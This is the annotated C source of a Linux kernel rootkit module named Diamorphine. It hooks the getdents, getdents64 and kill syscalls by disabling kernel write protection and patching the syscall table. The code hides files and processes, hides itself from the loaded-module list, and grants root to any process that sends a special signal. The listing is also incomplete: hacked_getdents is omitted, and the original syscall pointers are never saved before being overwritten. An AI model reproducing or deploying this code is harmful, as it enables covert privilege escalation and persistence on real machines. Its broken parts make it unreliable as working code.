#include <linux/sched.h>    // Provides access to the task scheduler.
#include <linux/module.h>   // Necessary for all kernel modules.
#include <linux/syscalls.h> // Provides system call definitions.
#include <linux/dirent.h>   // Directory-related functions.
#include <linux/slab.h>     // Provides kernel memory allocation.
#include <linux/version.h>  // Allows checking the kernel version.

#if LINUX_VERSION_CODE < KERNEL_VERSION(4, 13, 0)
#include <asm/uaccess.h>    // Memory access to user-space (for older kernels).
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/proc_ns.h>  // For accessing process namespace info.
#else
#include <linux/proc_fs.h>  // Access to the process filesystem.
#endif

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 26)
#include <linux/file.h>     // File access for very old kernels.
#else
#include <linux/fdtable.h>  // File descriptor tables for modern kernels.
#endif

#if LINUX_VERSION_CODE <= KERNEL_VERSION(2, 6, 18)
#include <linux/unistd.h>   // System call numbers for older kernels.
#endif

#ifndef __NR_getdents
#define __NR_getdents 141    // Define getdents syscall number if not defined.
#endif

#include "diamorphine.h"    // Include the rootkit’s own header file.

#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
unsigned long cr0;           // Will store the value of the CR0 register (x86).
#elif IS_ENABLED(CONFIG_ARM64)
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
#define section_size init_begin - start_rodata
#endif

static unsigned long *__sys_call_table;  // Pointer to the system call table.

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
    typedef asmlinkage long (*t_syscall)(const struct pt_regs *);   // Function pointer for syscalls for newer kernels.
    static t_syscall orig_getdents;     // Original getdents syscall.
    static t_syscall orig_getdents64;   // Original getdents64 syscall.
    static t_syscall orig_kill;         // Original kill syscall.
#else
    typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *, unsigned int);   // Function pointer for older kernel syscalls.
    typedef asmlinkage int (*orig_getdents64_t)(unsigned int, struct linux_dirent64 *, unsigned int);
    typedef asmlinkage int (*orig_kill_t)(pid_t, int);
    orig_getdents_t orig_getdents;      // Original getdents syscall.
    orig_getdents64_t orig_getdents64;  // Original getdents64 syscall.
    orig_kill_t orig_kill;              // Original kill syscall.
#endif

/**
 * get_syscall_table_bf: This function locates the system call table in memory.
 * For newer kernels, it uses kallsyms_lookup_name via a kprobe to locate the sys_call_table.
 * For older kernels, it searches through memory for the sys_call_table by comparing sys_close entries.
 */
unsigned long *get_syscall_table_bf(void)
{
    unsigned long *syscall_table;

#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
#ifdef KPROBE_LOOKUP
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);   // Lookup function for kernel symbols.
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);  // Registers a kprobe to get the address of kallsyms_lookup_name.
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
#endif
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");  // Fetch the system call table address.
    return syscall_table;
#else
    unsigned long int i;

    // Loop through memory to locate the sys_call_table based on the address of sys_close.
    for (i = (unsigned long int)sys_close; i < ULONG_MAX; i += sizeof(void *)) {
        syscall_table = (unsigned long *)i;

        if (syscall_table[__NR_close] == (unsigned long)sys_close)  // If the entry matches sys_close, return the syscall table.
            return syscall_table;
    }
    return NULL;  // Return NULL if the syscall table is not found.
#endif
}

/**
 * find_task: Given a PID, this function locates the corresponding task_struct.
 * It loops through all processes to find the one with the matching PID.
 */
struct task_struct *find_task(pid_t pid)
{
    struct task_struct *p = current;  // Start with the current process.
    for_each_process(p) {             // Loop through all processes.
        if (p->pid == pid)
            return p;  // Return the task_struct if the PID matches.
    }
    return NULL;  // Return NULL if no matching process is found.
}

/**
 * is_invisible: This function checks if a task (process) is marked as invisible.
 * It checks if the task has the PF_INVISIBLE flag set.
 */
int is_invisible(pid_t pid)
{
    struct task_struct *task;
    if (!pid)  // Return 0 if the PID is 0.
        return 0;
    task = find_task(pid);  // Find the task associated with the PID.
    if (!task)  // Return 0 if the task isn't found.
        return 0;
    if (task->flags & PF_INVISIBLE)  // Check if the PF_INVISIBLE flag is set.
        return 1;
    return 0;
}

// The following is a function that hooks and hijacks the getdents64 system call for hiding files and directories.
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) {
#if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    int fd = (int) pt_regs->di;   // Get the file descriptor.
    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->si;  // Get the directory entry.
#elif IS_ENABLED(CONFIG_ARM64)
    int fd = (int) pt_regs->regs[0];
    struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
#endif
    int ret = orig_getdents64(pt_regs), err;   // Call the original getdents64 syscall.
#else
asmlinkage int hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count)
{
    int ret = orig_getdents64(fd, dirent, count), err;
#endif

    unsigned short proc = 0;
    unsigned long off = 0;
    struct linux_dirent64 *dir, *kdirent, *prev = NULL;
    struct inode *d_inode;

    if (ret <= 0)  // If no entries are returned, exit early.
        return ret;

    kdirent = kzalloc(ret, GFP_KERNEL);  // Allocate kernel memory for the directory entries.
    if (kdirent == NULL)
        return ret;

    err = copy_from_user(kdirent, dirent, ret);  // Copy user-space directory entries to kernel space.
    if (err)
        goto out;

#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
    d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;  // Get the inode for the directory.
#else
    d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
#endif
    if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))  // Check if we are in the /proc directory.
        proc = 1;

    while (off < ret) {
        dir = (void *)kdirent + off;  // Loop through directory entries.
        if ((!proc && (memcmp(MAGIC_PREFIX, dir->d_name, strlen(MAGIC_PREFIX)) == 0)) ||  // Hide directories with a special prefix.
            (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {  // Hide processes marked as invisible.
            if (dir == kdirent) {
                ret -= dir->d_reclen;  // Adjust the length of the entries.
                memmove(dir, (void *)dir + dir->d_reclen, ret);
                continue;
            }
            prev->d_reclen += dir->d_reclen;  // Link the previous entry to skip the hidden one.
        } else
            prev = dir;
        off += dir->d_reclen;  // Move to the next entry.
    }
    err = copy_to_user(dirent, kdirent, ret);  // Copy the modified directory entries back to user space.
    if (err)
        goto out;

out:
    kfree(kdirent);  // Free the kernel memory.
    return ret;  // Return the modified directory entries.
}

// There is a similar function for hijacking the getdents system call for hiding files in older kernels.

void give_root(void)
{
    #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
        current->uid = current->gid = 0;       // For older kernels, directly set the UID and GID to 0 (root).
        current->euid = current->egid = 0;
        current->suid = current->sgid = 0;
        current->fsuid = current->fsgid = 0;
    #else
        struct cred *newcreds;
        newcreds = prepare_creds();            // For newer kernels, use the credentials API to gain root privileges.
        if (newcreds == NULL)
            return;
        newcreds->uid.val = newcreds->gid.val = 0;
        newcreds->euid.val = newcreds->egid.val = 0;
        newcreds->suid.val = newcreds->sgid.val = 0;
        newcreds->fsuid.val = newcreds->fsgid.val = 0;
        commit_creds(newcreds);                // Commit the new credentials, effectively making the process root.
    #endif
}

// These functions hide or show the kernel module in the list of loaded modules.
static inline void tidy(void) {
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
void module_show(void) {
    list_add(&THIS_MODULE->list, module_previous);  // Re-add the module to the module list.
    module_hidden = 0;
}

void module_hide(void) {
    module_previous = THIS_MODULE->list.prev;  // Store the previous list entry.
    list_del(&THIS_MODULE->list);              // Remove the module from the module list (hides it).
    module_hidden = 1;
}

// The `kill` system call is hijacked to enable special features, such as making a process invisible or giving root access.
asmlinkage int hacked_kill(pid_t pid, int sig)
{
    struct task_struct *task;
    switch (sig) {
        case SIGINVIS:
            if ((task = find_task(pid)) == NULL)
                return -ESRCH;  // Toggle the invisibility of a process.
            task->flags ^= PF_INVISIBLE;
            break;
        case SIGSUPER:
            give_root();  // Provide root access to the current process.
            break;
        case SIGMODINVIS:
            if (module_hidden) module_show();  // Toggle module visibility.
            else module_hide();
            break;
        default:
            return orig_kill(pid, sig);  // If none of the special signals match, execute the original kill syscall.
    }
    return 0;
}

static inline void protect_memory(void) {
    #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    write_cr0(cr0);  // Restore CR0 to re-enable write protection.
    #elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO);
    #endif
}

static inline void unprotect_memory(void) {
    #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
    write_cr0(cr0 & ~0x00010000);  // Temporarily disable write protection by clearing the WP (write-protect) bit in CR0.
    #elif IS_ENABLED(CONFIG_ARM64)
    update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL);
    #endif
}

// The initialization function for the module. It locates the syscall table, hijacks syscalls, and hides the module.
static int __init diamorphine_init(void)
{
    __sys_call_table = get_syscall_table_bf();  // Locate the system call table.
    if (!__sys_call_table)
        return -1;

    cr0 = read_cr0();  // Save the current CR0 value (for x86).

    module_hide();  // Hide the module from the list of loaded modules.
    tidy();         // Clean up any module section attributes.

    unprotect_memory();  // Disable write protection.

    // Hook system calls by replacing the entries in the system call table.
    __sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)hacked_kill;

    protect_memory();  // Re-enable write protection.

    return 0;
}

// Cleanup function for the module. It restores the original syscalls and unhides the module.
static void __exit diamorphine_cleanup(void)
{
    unprotect_memory();  // Disable write protection.

    // Restore the original system calls.
    __sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

    protect_memory();  // Re-enable write protection.
}

// Register the init and exit functions for the module.
module_init(diamorphine_init);
module_exit(diamorphine_cleanup);

MODULE_LICENSE("Dual BSD/GPL");  // Module license.
MODULE_AUTHOR("m0nad");          // Author information.
MODULE_DESCRIPTION("LKM rootkit");  // Module description.
